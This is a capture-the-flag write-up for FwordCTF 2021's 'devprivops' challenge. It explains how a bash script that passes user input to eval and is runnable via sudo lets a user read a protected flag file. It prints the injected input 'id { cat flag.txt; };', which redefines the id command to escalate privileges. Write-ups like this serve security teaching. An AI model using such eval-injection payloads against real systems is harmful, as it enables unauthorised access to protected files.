## Intro
**devprivops** was a bash challenge at FwordCTF 2021.  

You were given access to a linux machine through SSH as _user1_. In the home directory of the user two files of interest can be found - a [shell script](devops.sh) and a `flag.txt`. Both files belong to root and only another user on the system called _user-privileged_ was granted read access to the flag.

```
user1@da8cb1333b60:/home/user1$ ls -la
total 32
drwxrwxr-t 1 root  user1           4096 Aug 27 22:44 ./
drwxr-xr-x 1 root  root            4096 Aug 27 22:43 ../
-rw-r--r-- 1 user1 user1            220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 user1 user1           3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 user1 user1            807 Feb 25  2020 .profile
-rwxr-xr-x 1 root  user-privileged  945 Aug 27 22:09 devops.sh*
-rwxr----- 1 root  user-privileged   67 Aug 27 22:09 flag.txt*
```

Let's escalate!

## Investigation
By inspecting the shell script we learn that we can supply two parameters `-d` and `-p`.  

The `-d` parameter block essentially lets us input the name of a function which gets defined by `eval` and exported afterwards.

```bash
if [[ deploy -eq 1 ]];then
        echo -ne "Please enter your true name if you are a shinobi\n"  
        read -r name
        eval "function $name { terraform init &>/dev/null && terraform apply &>/dev/null ; echo \"It should be deployed now\"; }"
        export -f $name
fi
```

Unfortunately, it seems we can never run it since it's impossible to get past the admin check.

```bash
isAdmin=0
# Ofc only admins can deploy stuffs o//
if [[ $isAdmin -eq 1 ]];then
        $name
fi
```

Or can we?

The evaluation of the `-p` parameter block follows directly after and prints out our current permissions by calling `id`.

```bash
if [[ $permission -eq 1 ]];then
        echo "You are: " 
        id
fi
```

## Solution
A quick `sudo -l` reveals we have the ability to execute [devops.sh](devops.sh) as the _user-privileged_.

```
user1@7c47d98c8907:/home/user1$ sudo -l
Matching Defaults entries for user1 on 7c47d98c8907:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on 7c47d98c8907:
    (user-privileged) NOPASSWD: /home/user1/devops.sh
```

So we execute the script as `sudo -u user-privileged ./devops.sh -d -p` and input the payload `id { cat flag.txt; };`, overwriting the `id` function with our malicious one. When the `-p` parameter block gets evaluated afterwards and our `id` is called, the flag gets exposed!

> FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}
